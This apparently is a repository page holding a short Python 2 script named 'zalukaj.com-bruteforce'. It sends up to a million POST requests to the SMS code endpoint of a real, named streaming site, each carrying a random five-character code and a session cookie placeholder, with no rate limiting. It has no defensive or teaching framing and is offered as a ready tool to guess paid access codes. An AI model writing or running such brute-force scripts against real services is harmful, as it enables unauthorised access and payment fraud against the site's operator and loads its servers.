# zalukaj.com-bruteforce

```python
#!/usr/bin/env python
 
import requests, string
from random import *
 
iter = 1000000
timeout = 10.000
NOTIFI = 1
 
max_chars = 5
min_chars = 5
used = ["00000"]
smscode = "00000"
chars = string.digits + string.ascii_uppercase
 
url = 'https://zalukaj.com/sms'
headers = {
    "Origin": "https://zalukaj.com",
    "Accept-Encoding": "gzip, deflate, br",
    "Authority": "zalukaj.com",
    "Cookie": "XXXX",
    "Referer": "https://zalukaj.com/sms",
}
 
def send_post(_url, _data, _headers, _timeout):
    try:
        resp = requests.post(_url, data=_data, headers=_headers, timeout=_timeout)
        return resp.status_code
    except requests.exceptions.HTTPError as errh:
        notifi("Http Error: " + str(errh), NOTIFI)
        return 0
    except requests.exceptions.ConnectionError as errc:
        notifi("Error Connecting: " + str(errc), NOTIFI)
        return 0
    except requests.exceptions.Timeout as errt:
        notifi("Timeout Error: " + str(errt), NOTIFI)
        return 0
    except requests.exceptions.RequestException as err:
        notifi("OOps: Something Else" + str(err), NOTIFI)
        return 0
 
def notifi(_msg, _not):
    if _not == 1: print _msg
 
if __name__ == "__main__":
    try:
        for i in xrange(iter):
            while smscode in used:
                smscode = "".join(choice(chars) for x in range(randint(min_chars, max_chars)))
            used.append(smscode)
 
            data = {'sms_code': smscode}
 
            while True:
                if send_post(url, data, headers, timeout) != 200:
                    notifi("Failed to send POST, retrying.. %s -> %s" % (data, url), NOTIFI)
                    pass
                else:
                    notifi("POST sent successfully! %s -> %s, #%s" % (data, url, i), NOTIFI)
                    break
    except:
        print "Work done."
```
